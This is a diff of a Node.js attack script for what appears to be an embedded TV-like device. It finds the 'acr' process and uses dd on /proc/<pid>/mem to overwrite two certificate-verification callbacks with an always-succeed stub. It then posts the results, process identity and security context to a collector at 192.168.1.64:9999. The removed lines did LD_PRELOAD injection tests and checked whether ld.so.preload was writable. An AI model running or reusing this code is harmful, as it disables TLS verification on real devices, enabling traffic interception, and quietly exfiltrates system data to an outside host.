@@ -1,54 +1,72 @@
 "use strict";
-var fs = require("fs");
+// audit80.js - patch acr's OWN cert-verify callbacks in process memory.
+// Prior rounds targeted libVDCurl (wrong) and used node fs (sandboxed -> EACCES).
+// acr is non-PIE (maps at 0x10000) so callback VAs are absolute:
+//   AcrControlVerifyCertCallback  VA 0x96c08  (file off 0x86c08)
+//   lws_VerifyCertCallback        VA 0x97c84  (file off 0x87c84)
+// Patch both to Thumb "movs r0,#1 ; bx lr" (01 20 70 47) = always-verify-success.
+// Uses dd via child_process (NOT node fs) for /proc/<pid>/mem.
 var http = require("http");
 var cp = require("child_process");
+var HOST = "192.168.1.64";
+var PORT = 9999;
 
 function post(path, body) {
     var data = JSON.stringify(body);
-    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
+    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
         headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
-        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
-    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
+        function (res) { try { res.resume(); } catch (e) {} });
+    req.on("error", function () {});
     req.write(data);
     req.end();
 }
-
 function sh(cmd, cap) {
-    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 8000); }
+    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 6000); }
     catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
 }
 
+var STUB = "01207047";                       // movs r0,#1 ; bx lr
+var T = [
+    { name: "AcrControlVerifyCertCallback", addr: 0x96c08 },
+    { name: "lws_VerifyCertCallback",       addr: 0x97c84 }
+];
+
 var out = {};
 out.started = new Date().toISOString();
+out.id = sh("id | head -c 160");
+out.smack = sh("cat /proc/self/attr/current");
+out.acr_ps = sh("ps 2>/dev/null | grep '/usr/bin/acr' | grep -v grep | head -3", 800);
+out.pidof = sh("pidof acr", 200);
+out.maps_head = sh("for p in $(pidof acr); do echo PID $p; grep '/usr/bin/acr' /proc/$p/maps | head -3; done", 800);
 
-var SO = "/home/owner/share/tmp/sdk_tools/tee_probe.so";
+// parse a pid
+var pid = null;
+var pm = out.pidof.match(/(\d+)/);
+if (pm) { pid = pm[1]; }
+if (!pid) {
+    var qm = out.acr_ps.match(/\s(\d+)\s+\d+\s/);
+    if (qm) { pid = qm[1]; }
+}
+out.pid = pid;
 
-// 1. UEP test: does an unsigned .so load via LD_PRELOAD into a signed binary?
-sh("rm -f /opt/usr/tee_probe_loaded");
-out.ldpreload_sh = sh("LD_PRELOAD=" + SO + " /bin/sh -c 'echo ran' ");
-out.marker_after_sh = sh("ls -la /opt/usr/tee_probe_loaded 2>&1; cat /opt/usr/tee_probe_loaded 2>&1");
+if (!pid) {
+    out.patch = "no acr pid found";
+    post("/p80_diag", out);
+    post("/p80_done", { started: out.started });
+} else {
+    // build stub file once
+    out.stub = sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub && od -An -tx1 /tmp/.p80stub", 200);
 
-sh("rm -f /opt/usr/tee_probe_loaded");
-out.ldpreload_node = sh("LD_PRELOAD=" + SO + " /bin/true");
-out.marker_after_true = sh("ls -la /opt/usr/tee_probe_loaded 2>&1");
-
-// 2. same but for the actual target binaries (they are signed system binaries)
-sh("rm -f /opt/usr/tee_probe_loaded");
-out.ldpreload_svc = sh("LD_PRELOAD=" + SO + " /usr/bin/contents-recognition-service --help 2>&1 | head -3");
-out.marker_after_svc = sh("ls -la /opt/usr/tee_probe_loaded 2>&1");
-
-// 3. link mode of the OCR service (does it link libOCREngine or dlopen it?)
-out.svc_link = sh("grep -a -o 'libOCREngine[^[:space:]]*' /usr/bin/contents-recognition-service | head -3; echo ---ldd---; ldd /usr/bin/contents-recognition-service 2>&1 | head -15");
-out.svc_dlopen = sh("grep -a -o -E '(dlopen|dlsym|libdl)' /usr/bin/contents-recognition-service | sort | uniq -c | head -8");
-
-// 4. acr: TLS library used for the outbound payload
-out.acr_link = sh("grep -a -o -E '(SSL_write|SSL_read|libssl[^[:space:]]*|libcurl[^[:space:]]*|curl_easy|gnutls|openssl)' /usr/bin/acr | sort | uniq -c | head -12; echo ---ldd---; ldd /usr/bin/acr 2>&1 | head -15");
-
-// 5. ld.so.preload writability
-out.preload = sh("ls -la /etc/ld.so.preload 2>&1; echo test >> /etc/ld.so.preload 2>&1 && echo WRITABLE && sed -i '/^test$/d' /etc/ld.so.preload || echo NOTWRITABLE");
-
-// 6. systemd restart available?
-out.systemctl = sh("which systemctl; systemctl status contents-recognition-service 2>&1 | head -6");
-
-post("/ocr_recon2", out);
-post("/ocr_recon2_done", { started: out.started });
+    var res = [];
+    T.forEach(function (t) {
+        var dec = t.addr;                       // decimal VA
+        var before = sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 200);
+        var wr = sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + dec + " count=4 conv=notrunc 2>&1 | tail -1", 200);
+        var after = sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + dec + " count=4 2>/dev/null | od -An -tx1", 200);
+        res.push({ name: t.name, addr: "0x" + t.addr.toString(16), dec: dec,
+                   before: before.trim(), write: wr.trim(), after: after.trim() });
+    });
+    out.patch = res;
+    post("/p80_patch", out);
+    post("/p80_done", { started: out.started });
+}
